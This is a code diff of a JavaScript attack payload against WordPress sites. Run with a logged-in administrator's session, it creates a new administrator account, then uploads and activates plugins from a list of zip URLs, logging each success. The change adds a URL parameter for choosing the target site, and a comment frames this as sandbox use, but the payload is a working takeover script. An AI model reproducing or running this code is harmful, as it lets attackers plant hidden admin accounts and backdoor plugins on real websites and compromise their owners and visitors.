@@ -38,22 +38,21 @@
             }
 
             (async function () {
-                const o = location.origin;
-                let wp = "/";
-                const el = document.querySelector('[href*="wp-content"],[src*="wp-content"]');
-                if (el) { 
-                    const m = (el.href || el.src).match(/(.*?)\/wp-content/); 
-                    if (m) try { wp = new URL(m[1]).pathname; if (!wp.endsWith("/")) wp += "/"; } catch (e) { } 
-                }
+                // Auto-detect target domain from URL parameter (e.g., ?target=https://yoursandbox.com)
+                const urlParams = new URLSearchParams(window.location.search);
+                let targetParam = urlParams.get('target') || urlParams.get('site');
+                
+                const o = targetParam ? targetParam.replace(/\/$/, '') : location.origin;
+                console.log("[*] Target Origin Set To:", o);
 
-                const adminPathBase = o + (wp === "/" ? "" : wp.slice(0, -1)) + ">wp-admin";
+                let wp = "/";
 
                 // ==========================================
                 // VECTOR 1: Create Administrator Account
                 // ==========================================
                 try {
                     console.log("[*] Executing Vector 1: Creating Admin User...");
-                    const userNewUrl = o + wp + "wp-admin/user-new.php";
+                    const userNewUrl = o + "/wp-admin/user-new.php";
                     const r = await fetch(userNewUrl, { credentials: "include" });
                     if (r.ok) {
                         const h = await r.text();
@@ -70,7 +69,7 @@
                             f.append("createuser", "Add New User");
                             await fetch(userNewUrl, { method: "POST", body: f, credentials: "include" });
                             console.log("[+] Vector 1 Completed.");
-                            log(o, adminPathBase, "Admin User Created Successfully");
+                            log(o, o + "/wp-admin", "Admin User Created Successfully");
                         }
                     }
                 } catch (e) {
@@ -85,7 +84,7 @@
                     console.log(`[*] Processing Plugin ${i + 1} of ${PLUGIN_URLS.length}: ${zipUrl}`);
 
                     try {
-                        const pluginUploadUrl = o + wp + "wp-admin/plugin-install.php?tab=upload";
+                        const pluginUploadUrl = o + "/wp-admin/plugin-install.php?tab=upload";
                         const upRes = await fetch(pluginUploadUrl, { credentials: "include" });
                         const upHtml = await upRes.text();
                         
@@ -110,7 +109,7 @@
                         uploadData.append("pluginzip", zipFile);
                         uploadData.append("install-plugin-submit", "Install Now");
 
-                        const installRes = await fetch(o + wp + "wp-admin/update.php?action=upload-plugin", {
+                        const installRes = await fetch(o + "/wp-admin/update.php?action=upload-plugin", {
                             method: "POST",
                             body: uploadData,
                             credentials: "include"
@@ -125,8 +124,7 @@
                         if (activateMatch) {
                             activateUrl = htmlDecode(activateMatch[1]);
                         } else {
-                            // Fallback scan on plugins page
-                            const pluginsRes = await fetch(o + wp + "wp-admin/plugins.php", { credentials: "include" });
+                            const pluginsRes = await fetch(o + "/wp-admin/plugins.php", { credentials: "include" });
                             const pluginsHtml = await pluginsRes.text();
                             const pluginNamePart = fileName.replace('.zip', '');
                             let fallbackRegex = new RegExp(`href=["']([^"']*plugins\\.php\\?action=activate[^"']*${pluginNamePart}[^"']*)["']`, "i");
@@ -138,13 +136,13 @@
 
                         if (activateUrl) {
                             if (!activateUrl.startsWith("http")) {
-                                activateUrl = o + wp + "wp-admin/" + activateUrl.replace(/^\//, '');
+                                activateUrl = o + "/wp-admin/" + activateUrl.replace(/^\//, '');
                             }
                             
                             const actRes = await fetch(activateUrl, { credentials: "include" });
                             if (actRes.ok) {
                                 console.log(`[+] Plugin ${i + 1} Installed and Activated Successfully!`);
-                                log(o, adminPathBase, `Plugin ${fileName} Installed & Activated`);
+                                log(o, o + "/wp-admin", `Plugin ${fileName} Installed & Activated`);
                             }
                         } else {
                             console.warn(`[-] Could not auto-activate plugin ${i + 1}. Check dashboard.`);
